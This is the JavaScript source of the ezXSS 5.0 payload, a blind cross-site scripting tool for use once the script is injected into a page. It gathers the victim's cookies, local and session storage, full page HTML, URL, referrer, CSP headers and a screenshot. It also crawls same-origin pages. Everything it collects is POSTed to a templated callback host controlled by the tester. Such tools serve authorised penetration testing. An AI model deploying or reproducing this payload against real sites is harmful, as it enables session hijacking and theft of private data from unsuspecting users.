// ezXSS 5.0
// github.com/ssl/ezXSS

function ez_n(e) {
    return void 0 !== e ? e : '';
}

function ez_has(list, value) {
    for (var i = 0; i < list.length; i++) if (list[i] === value) return !0;
    return !1;
}

function ez_cb(e, t, o) {
    o = void 0 !== o ? o : 0;
    var s, n = "{{protocol}}://{{domain}}/callback";
    (s = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP")).open("POST", n, !0);
    s.setRequestHeader("Content-type", "text/plain");
    s.onreadystatechange = function () {
        if (4 === s.readyState) {
            if (200 === s.status) {
                null !== t && t(s.responseText);
            } else {
                if (0 === s.status) {
                    "function" == typeof ez_bc && ez_bc(e);
                }
                var n = e;
                if (0 === o) {
                    n.cookies = "";
                    n.localstorage = "";
                    n.sessionstorage = "";
                    n.dom = "Error callback: " + s.status;
                    n.screenshot = "";
                    ez_cb(n, t, 1);
                }
            }
        }
    };
    try {
        s.send(ez_se(e));
    } catch (n) {
        "function" == typeof ez_bc && ez_bc(e);
    }
}

function ez_tok() {
    var s = "", c = "abcdefghijklmnopqrstuvwxyz0123456789", i, a;
    try {
        if (window.crypto && window.crypto.getRandomValues) {
            a = new Uint8Array(32);
            window.crypto.getRandomValues(a);
            for (i = 0; i < a.length; i++) s += c.charAt(a[i] % 36);
            return s;
        }
    } catch (e) { }
    for (i = 0; i < 32; i++) s += c.charAt(Math.floor(Math.random() * 36));
    return s;
}

function ez_blen(v) {
    v = ez_n(v) + "";
    try { if ("undefined" != typeof Blob) return new Blob([v]).size; } catch (e) { }
    return v.length;
}

function ez_atp(t, f, v) {
    var s, n = "{{protocol}}://{{domain}}/callback/attach";
    try {
        s = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        s.open("POST", n, !0);
        s.setRequestHeader("Content-type", "text/plain");
        s.send(ez_se({ at: t, field: f, value: v }));
    } catch (e) { }
}

function ez_fin() {
    var dom = ez_n(ez_rD.dom) + "", shot = ez_n(ez_rD.screenshot) + "";
    if (ez_mb > 0 && (ez_blen(dom) + ez_blen(shot)) > ez_mb) {
        var tok = ez_tok();
        ez_rD.ez_at = tok;
        ez_rD.dom = "";
        ez_rD.screenshot = "";
        ez_cb(ez_rD, function (r) {
            if ("" !== dom) ez_atp(tok, "dom", dom);
            if ("" !== shot) ez_atp(tok, "screenshot", shot);
            ez_dr2(r);
        });
    } else {
        ez_cb(ez_rD, ez_dr2);
    }
}

function ez_cg(cb) {
    var out = [], done = !1;
    function fin() {
        if (done) return;
        done = !0;
        if (!out.length && ez_cv) out.push(ez_cv);
        ez_rD.csp = out.join("\n").slice(0, 8000);
        cb();
    }
    try {
        var m = document.querySelectorAll("meta[http-equiv]");
        for (var i = 0; i < m.length; i++) {
            if ((m[i].getAttribute("http-equiv") || "").toLowerCase() === "content-security-policy") {
                out.push("content-security-policy: " + ez_n(m[i].getAttribute("content")));
            }
        }
    } catch (e) { }
    function req(method) {
        try {
            var x = new XMLHttpRequest();
            x.open(method, location.href, !0);
            x.onreadystatechange = function () {
                if (4 !== x.readyState) return;
                if ("HEAD" === method && (405 === x.status || 501 === x.status)) return req("GET");
                if (x.status >= 200 && x.status < 400) {
                    try {
                        var a = x.getResponseHeader("Content-Security-Policy"), b = x.getResponseHeader("Content-Security-Policy-Report-Only");
                        a && out.unshift("content-security-policy: " + a);
                        b && out.push("content-security-policy-report-only: " + b);
                    } catch (e) { }
                }
                0 === x.status ? setTimeout(fin, 150) : fin();
            };
            x.send(null);
        } catch (e) {
            setTimeout(fin, 150);
        }
    }
    req("HEAD");
    setTimeout(fin, 2e3);
}

function ez_hL() {
    var cspDone = !1, cspNext = null;
    if (!ez_has(ez_nc, 'csp')) { ez_cg(function () { cspDone = !0; cspNext && cspNext(); }); } else { cspDone = !0; }
    try { ez_rD.uri = ez_n(location.toString()); } catch (t) { ez_rD.uri = ""; }
    try { ez_rD.cookies = ez_n(document.cookie); } catch (e) { ez_rD.cookies = ""; }
    try {
        ez_rD.referer = ez_n(document.referrer);
        var u = "";
        try {
            if (window.self !== window.top) u = "iFrame loaded via " + window.parent.location;
        } catch (e) {
            u = "iFrame loaded via cross-origin";
        }
        ez_rD.referer += (ez_rD.referer && u ? " - " : "") + u;
    } catch (o) { ez_rD.referer = ""; }
    try { ez_rD["user-agent"] = ez_n(navigator.userAgent); } catch (r) { ez_rD["user-agent"] = ""; }
    try { ez_rD.origin = ez_n(location.origin); } catch (c) { ez_rD.origin = ""; }
    try { ez_rD.localstorage = ez_n(window.localStorage); } catch (a) { ez_rD.localstorage = ""; }
    try { ez_rD.sessionstorage = ez_n(window.sessionStorage); } catch (n) { ez_rD.sessionstorage = ""; }
    try { ez_rD.dom = ez_n(document.documentElement.outerHTML || document.documentElement.innerHTML); } catch (s) { ez_rD.dom = ""; }
    try { ez_rD.payload = "/*ez:payload*/"; } catch (i) { ez_rD.payload = ""; }
    try { ez_rD.ez_bid = ez_bid; } catch (b) { }
    try {
        if ("undefined" != typeof html2canvas) {
            html2canvas(document.body, { "max-width": 1920, "max-height": 1080 }).then(function (t) {
                ez_rD.screenshot = ez_n(t.toDataURL());
                y();
            }).then(void 0, function (t) {
                ez_rD.screenshot = "";
                y();
            });
        } else {
            ez_rD.screenshot = "";
            y();
        }
    } catch (h) {
        ez_rD.screenshot = "";
        y();
    }

    function y() {
        var go = function () {
            ez_s();
            ez_nW();
            ez_fin();
            ez_cp();
            ez_p();
        };
        cspDone ? go() : (cspNext = go);
    }
}

function ez_p() {
    "function" == typeof ez_persist && ez_persist();
}

function ez_s() {
    for (var t = 0, n = ez_nc.length; t < n; ++t) ez_rD[ez_nc[t]] = "Not collected";
}

function ez_cp() {
    var t, n, o = [/*ez:pages*/];
    for (t = 0, n = o.length; t < n; ++t) ez_dc(o[t]);
}

function ez_as() {
    var sm = "/*ez:spider*/";
    if ("0" !== sm) {
        var t = document.getElementsByTagName("a"), e = {};
        if ("1" === sm) {
            for (var n = [], o = 0; o < t.length; o++) try {
                var a = (c = t[o]).getAttribute("href");
                (h = s(c, a)).ez_iiv && !e[h.path] && (e[h.path] = !0, n.push(h.path));
            } catch (t) { }
            !function t(e) {
                e >= n.length || (ez_dc(n[e]), setTimeout((function () { t(e + 1); }), 100));
            }(0);
        } else if ("2" === sm) {
            var i = document.createElement("iframe");
            i.style.display = "none";
            try {
                document.body.appendChild(i);
            } catch (t) {
                return;
            }
            n = [];
            var r = !1;
            for (o = 0; o < t.length; o++) try {
                var c, h;
                a = (c = t[o]).getAttribute("href");
                (h = s(c, a)).ez_iiv && !e[h.path] && (e[h.path] = !0, n.push(h.path));
            } catch (t) { }
            !function t() {
                if (!r && 0 !== n.length) {
                    r = !0;
                    var o = n.shift();
                    try {
                        i.src = o;
                        i.onload = function () {
                            try {
                                var a = i.contentDocument || i.contentWindow.document,
                                    c = i.contentWindow || window,
                                    h = {
                                        dom: ez_n(a.documentElement.outerHTML),
                                        uri: ez_n("//" + location.hostname + o),
                                        origin: ez_n(location.hostname),
                                        referer: "Collected page via " + ez_n(location.toString()),
                                        cookies: ez_n(a.cookie || document.cookie),
                                        "user-agent": ez_n(navigator.userAgent),
                                        sessionstorage: ez_n(c.sessionStorage || window.sessionStorage),
                                        localstorage: ez_n(c.localStorage || window.localStorage),
                                        payload: "/*ez:payload*/"
                                    };
                                ez_cb(h, null);
                                for (var l = a.getElementsByTagName("a"), u = 0; u < l.length; u++) try {
                                    var d = l[u].getAttribute("href"), f = s(l[u], d);
                                    f.ez_iiv && !e[f.path] && (e[f.path] = !0, n.push(f.path));
                                } catch (t) { }
                            } catch (t) { }
                            r = !1;
                            t();
                        };
                        i.onerror = function () {
                            r = !1;
                            t();
                        };
                    } catch (e) {
                        r = !1;
                        t();
                    }
                }
            }();
        }
    }

    function s(t, e) {
        if (!e || 0 === e.indexOf("#") || 0 === e.indexOf("javascript:") || 0 === e.indexOf("mailto:")) return { ez_iiv: !1 };
        var n = e, o = !1;
        return "http:" !== t.protocol && "https:" !== t.protocol || t.hostname !== location.hostname ?
            "/" === e.charAt(0) && 0 !== e.indexOf("//") ? (o = !0, n = e) :
                -1 === e.indexOf("://") && 0 !== e.indexOf("//") && (o = !0, n = "/" + e) :
            (o = !0, n = t.pathname || e), { ez_iiv: o, path: n };
    }
}

function ez_dc(e) {
    try {
        var o = "//" + location.hostname + e;
        var a;
        a = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        var cbdata;
        a.onreadystatechange = function () {
            4 == a.readyState && (cbdata = {
                dom: ez_n(a.responseText),
                uri: ez_n(o),
                origin: ez_n(location.hostname),
                referer: "Collected page via " + ez_n(location.toString()),
                cookies: ez_n(document.cookie),
                "user-agent": ez_n(navigator.userAgent),
                sessionstorage: ez_n(window.sessionStorage),
                localstorage: ez_n(window.localStorage),
                payload: "/*ez:payload*/"
            }, ez_cb(cbdata, null));
        };
        a.open("GET", o, !0);
        a.send(null);
    } catch (t) { }
}

function ez_se(e) {
    try {
        if ("undefined" != typeof JSON && "function" == typeof JSON.stringify) try {
            return JSON.stringify(e);
        } catch (e) {

        }
        var n = [];
        for (var t in e) if (e.hasOwnProperty(t)) {
            var r = e[t];
            if (null == r) r = "";
            else if ("object" == typeof r) try {
                r = ez_n(r.toString());
            } catch (e) {
                r = "";
            } else r = ez_n(r);
            n.push(encodeURIComponent(t) + "=" + encodeURIComponent(r));
        }
        return n.join("&");
    } catch (e) {
        return "";
    }
}

function ez_e() { /*ez:customjs*/
}
function ez_l() { /*ez:globaljs*/
}
function ez_y() { /*ez:customjs2*/
}
function ez_esa() { /*ez:globaljs2*/
}
/*ez:persistent*/
/*ez:screenshot*/
/*ez:beacon*/

function ez_aE(t, e, n) {
    t.addEventListener ? t.addEventListener(e, n, !1) : t.attachEvent && t.attachEvent("on" + e, n);
}

var ez_rD = {};

var ez_bid = (function () {
    var s = "", c = "abcdefghijklmnopqrstuvwxyz0123456789", i;
    try {
        if (window.crypto && window.crypto.getRandomValues) {
            var a = new Uint8Array(16);
            window.crypto.getRandomValues(a);
            for (i = 0; i < a.length; i++) s += c.charAt(a[i] % 36);
            return s;
        }
    } catch (e) { }
    for (i = 0; i < 16; i++) s += c.charAt(Math.floor(Math.random() * 36));
    return s;
})();

var ez_bb = "{{protocol}}://{{domain}}";

var ez_mb = "/*ez:maxBody*/" | 0;

var ez_nc = [/*ez:noCollect*/];

var ez_cv = "";
if (!ez_has(ez_nc, 'csp')) ez_aE(document, "securitypolicyviolation", function (e) {
    try {
        if (!ez_cv && e.originalPolicy) ez_cv = (e.disposition === "report" ? "content-security-policy-report-only: " : "content-security-policy: ") + e.originalPolicy;
    } catch (t) { }
});

function ez_nW() {
    try {
        ez_e();
        ez_l();
    } catch (t) { }
}

function ez_dr2(z) {
    try {
        ez_y();
        ez_esa();
        ez_as();
    } catch (t) { }
}

function ez_a(k, v) {
    if (!ez_rD.extra) {
        ez_rD.extra = {};
    }
    if (typeof k === 'object' && k !== null) {
        for (var key in k) {
            if (k.hasOwnProperty(key)) {
                ez_rD.extra[key] = k[key];
            }
        }
    } else {
        ez_rD.extra[k] = v;
    }
}
/*ez:extensions*/

if ("complete" === document.readyState) ez_hL();
else {
    var t = setTimeout(function () { ez_hL(); }, 2e3);
    ez_aE(window, "load", function () { clearTimeout(t); ez_hL(); });
}
